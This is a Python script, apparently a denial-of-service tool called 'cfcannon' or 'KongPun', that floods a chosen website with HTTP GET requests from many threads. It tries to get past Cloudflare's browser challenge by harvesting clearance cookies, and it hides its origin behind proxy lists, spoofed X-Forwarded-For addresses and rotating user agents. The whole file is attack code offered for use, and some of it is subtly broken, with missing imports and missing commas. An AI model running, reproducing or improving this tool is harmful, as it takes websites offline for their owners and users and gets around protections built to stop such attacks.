import socket
import argparse
import ssl
import _thread
import threading
import random
import time
import subprocess
import sys

parser = argparse.ArgumentParser(description="cfcannon")
parser.add_argument('host', nargs="?", help="Host name, i.e: abc.com")
parser.add_argument('-d', '--dir', default="/webadmin/icon.png", help="/index.php /index.html")
parser.add_argument('-s', '--ssl', dest="ssl",
                    action="store_false", help="Debug info, default on")
parser.add_argument('-p', '--port', default=30120,
                    help="Port 80 or 443 ", type=int)
parser.add_argument('-t', '--threads', default=100,
                    help="Number of threads", type=int)
parser.add_argument('-l', '--time', default=9999,
                    help="how long (seconds) the attack lasts", type=int)
parser.add_argument('-x', '--proxy_file_location', default="proxy.list",
                    help="proxy file location. if empty, use direct connection")
args = parser.parse_args()
request_list = []
user_agents = [
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36",
        "Mozilla/5.0 (Linux; U; Android 1.5; en-us; SPH-M900 Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
    "Mozilla/5.0 (Linux; U; Android 1.5; en-us; T-Mobile G1 Build/CRB43) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari 525.20.1",
    "Mozilla/5.0 (Linux; U; Android 1.5; fr-fr; GT-I5700 Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
    "Mozilla/5.0 (Linux; U; Android 1.6; en-us; HTC_TATTOO_A3288 Build/DRC79) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
    "Mozilla/5.0 (Linux; U; Android 1.6; en-us; SonyEricssonX10i Build/R1AA056) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
    "Mozilla/5.0 (Linux; U; Android 1.6; es-es; SonyEricssonX10i Build/R1FA016) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
    "Mozilla/5.0 (Linux; U; Android 2.0.1; de-de; Milestone Build/SHOLS_U2_01.14.0) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
    "Mozilla/5.0 (Linux; U; Android 2.0; en-us; Droid Build/ESD20) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
    "Mozilla/5.0 (Linux; U; Android 2.0; en-us; Milestone Build/ SHOLS_U2_01.03.1) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
    "Mozilla/5.0 (Linux; U; Android 2.1; en-us; HTC Legend Build/cupcake) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
    "Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
    "Mozilla/5.0 (Linux; U; Android 2.1-update1; de-de; HTC Desire 1.19.161.5 Build/ERE27) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
    "Mozilla/5.0 (Linux; U; Android 2.2; en-ca; GT-P1000M Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.2; en-us; ADR6300 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.2; en-us; Sprint APA9292KT Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; BNTV250 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 3.0.1; en-us; GT-P7100 Build/HRI83) AppleWebkit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
    "Mozilla/5.0 (Linux; U; Android 3.0.1; fr-fr; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
    "Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
    "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
    "Mozilla/5.0 (Linux; U; Android 4.0.3; de-de; Galaxy S II Build/GRJ22) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
    "Mozilla/5.0 (Linux U; en-US)  AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) Version/4.0 Kindle/3.0 (screen 600x800; rotate)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Camino/2.2.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre Camino/2.2a1pre",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1) Gecko/20090624 Firefox/3.5",
    "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
    "Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a",
]
acceptall = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5\r\n",
	"accept: text/plain, */*; q=0.01"
	"Accept: text/plain, */*; q=0.01"
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
]
proxy_list = []
cf_token = []
args.host = str(sys.argv[1])
global url
if args.ssl:
    url = "http://" + args.host
else:
    url = "https://" + args.host


# Read proxy.list then append to proxy_list[]
def proxyget():
    proxy_file = open(args.proxy_file_location, "r")
    line = proxy_file.readline().rstrip()
    while line:
        proxy_list.append(line)
        line = proxy_file.readline().rstrip()
    proxy_file.close()


# Is target protected by Cloudflare?
def is_protected_by_cf():
    try:
        first_request = subprocess.check_output(
            ["curl", "-A", format(random.choice(user_agents)), args.host], timeout=0.5)
        first_request = first_request.decode("ascii", errors="ignore")
        find_keyword = False
        for line in first_request.splitlines():
            if line.find("Checking your browser before accessing") != -1:
                find_keyword = True
    except Exception:
        return False
    return find_keyword

def getToken(url):
    try:
        domain = url.replace('https://',"").replace("http://","").replace("www.","")
        UA = (ua_file)
        stime = time.time()
        headers = StringIO.StringIO()
        body = StringIO.StringIO()
        c = pycurl.Curl()
        c.setopt(pycurl.URL,url)
        c.setopt(pycurl.FOLLOWLOCATION, 1)
        c.setopt(pycurl.SSL_VERIFYPEER, 1)
        c.setopt(pycurl.SSL_VERIFYHOST, 1)
        c.setopt(pycurl.CONNECTTIMEOUT, 5)
        c.setopt(pycurl.MAXREDIRS, 5)
        c.setopt(pycurl.USERAGENT,UA)
        c.setopt(pycurl.HEADERFUNCTION, headers.write)
        c.setopt(pycurl.WRITEFUNCTION, body.write)
        c.perform()
        headers = headers.getvalue()
        body = body.getvalue()
        inputtext = re.findall('<input type="hidden" name="(.*?)" value="(.*?)"/>',body,re.S)
        text_cfduidtext = re.findall('__cfduid=(.*?);',headers,re.S)[0]
        text_pass = inputtext[1][1]
        text_jschl_vc = inputtext[0][1]
        text_jschl_answer = jschl_answer(body,domain)
        time.sleep(4)

        urlx = url + "/cdn-cgi/l/chk_jschl?jschl_vc=%s&pass=%s&jschl_answer=%s" % (text_jschl_vc,text_pass,text_jschl_answer)
        header = [ "Cookie: __cfduid=" + text_cfduidtext]
        headers = StringIO.StringIO()
        body = StringIO.StringIO()
        c = pycurl.Curl()
        c.setopt(pycurl.URL,urlx)
        c.setopt(pycurl.FOLLOWLOCATION, 1)
        c.setopt(pycurl.SSL_VERIFYPEER, 1)
        c.setopt(pycurl.SSL_VERIFYHOST, 1)
        c.setopt(pycurl.HEADER, True)  # Extend headrs
        c.setopt(pycurl.HTTPHEADER, header)
        c.setopt(pycurl.CONNECTTIMEOUT, 3)
        c.setopt(pycurl.FOLLOWLOCATION, False)  # Redirect
        c.setopt(pycurl.USERAGENT,UA)
        c.setopt(pycurl.HEADERFUNCTION, headers.write)
        c.setopt(pycurl.WRITEFUNCTION, body.write)
        c.perform()
        headers = headers.getvalue()
        text_cf_clearance = re.findall('cf_clearance=(.*?);',headers,re.S)[0]
        return {
            'UA':UA,
            'cfduid':text_cfduidtext,
            'cf_clearance':text_cf_clearance,
            'usedtime':time.time()-stime
        }
    except:
        return False

# set request for non cloud flare DDOS proction
def set_request():
    global request
    get_host = "GET " + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
    useragent = "User-Agent: " + random.choice(user_agents) + "\r\n"
    accept = random.choice(acceptall)
    connection = "Connection: Keep-Alive\r\n"
    request = get_host + useragent + accept + \
              connection + "\r\n"
    request_list.append(request)
	#PaT HTTP - CF SCE 5


# list = [proxy.ip#proxy.port#cftoken]
# Gerenarate cookies and useragent for cloud flare challenge page
def generate_cf_token(i):
    proxy = proxy_list[i].strip().split(":")
    proxies = {"http": "http://" + proxy[0] + ":" + proxy[1]}
    # proxies = {"http": "http://"+proxy[0]+":"+proxy[1],"https": "https://"+proxy[0]+":"+proxy[1]}
    try:
        cookie_value, user_agent = cfscrape.get_cookie_string(url, proxies=proxies)
        tokens_string = "Cookie: " + cookie_value + "\r\n"
        user_agent_string = "User-Agent: " + user_agent + "\r\n"
        cf_token.append(proxy[0] + "#" + proxy[1] + "#" + tokens_string + user_agent_string)
    except:
        pass


# set request for cloud flare challenge page
def set_request_cf():
    global request_cf
    global proxy_ip
    global proxy_port
    cf_combine = random.choice(cf_token).strip().split("#")
    proxy_ip = cf_combine[0]
    proxy_port = cf_combine[1]
    get_host = "GET " + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
    tokens_and_ua = cf_combine[2]
    '''
    print("ip: "+cf_combine[0]+"\n")
    print("port: "+cf_combine[1]+"\n")
    print("Cookie&UA: "+cf_combine[2]+"\n")
    '''
    accept = random.choice(acceptall)
    randomip = str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + \
               "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))

    forward = "X-Forwarded-For: " + randomip + "\r\n"
    connection = "Connection: Keep-Alive\r\n"
    request_cf = get_host + tokens_and_ua + accept + forward + connection + "\r\n"


def main():
    proxyget()
    global go
    global x
    x = 0
    go = threading.Event()
    if is_protected_by_cf():
        print ("\n---------------------------------------------------------------------")
        print ("Target: ", args.host, " is protected by Cloudfalre.")
        print (" KongPun HTTP | 2mins for bypass .   ")
        print ("---------------------------------------------------------------------")
        for i in range(args.threads):
            _thread.start_new_thread(generate_cf_token, (i,))
        time.sleep(120)
        for x in range(args.threads):
            set_request_cf()
            # print (request_cf)
            RequestProxyHTTP(x + 1).start()
            print ("ATTACK----------------> " + str(x) + " ready!")
        go.set()
    else:
        print ("\n---------------------------------------------------------------------")
        print ("Target: ", args.host, " is not protected by Cloudfalre.")
        print ("  KongPun | HTTP 5 seconds for UA Generation.   ")
        print ("---------------------------------------------------------------------")
        for x in range(args.threads):
            _thread.start_new_thread(set_request, ())
        time.sleep(5)
        for x in range(args.threads):
            request = random.choice(request_list)
            if args.ssl:
                RequestDefaultHTTP(x + 1).start()
            else:
                RequestDefaultHTTPS(x + 1).start()
            print ("ATTACK--------------> " + str(x) + " ready!")
        go.set()


class RequestDefaultHTTP(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        go.wait()
        while True:
            try:
                # creazione socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(args.host), int(args.port)))
                s.send(str.encode(request))  # invio
                print ("ATTACK DDOS WEBSIDE By KongPun -----------> ", self.counter)
                try:
                    for y in range(150):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()

class RequestDefaultHTTPS(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        go.wait()
        while True:
            try:
                # creazione socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(args.host), int(args.port)))
                s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE,
                                    ssl_version=ssl.PROTOCOL_SSLv23)
                s.send(str.encode(request))  # invio
                print ("ATTACK DDOS WEBSIDE By KongPun -----------> ", self.counter)
                try:
                    for y in range(300):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()

class RequestProxyHTTP(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(proxy_ip), int(proxy_port)))
                s.send(str.encode(request_cf))
                print ("Request sent from " +
                       str(proxy_ip + ":" + proxy_port) + " @", self.counter)
                try:
                    for y in range(100):
                        s.send(str.encode(request_cf))
                except:
                    pass
                    # s.close()
            except:
                pass
                # s.close()


if __name__ == "__main__":
    main()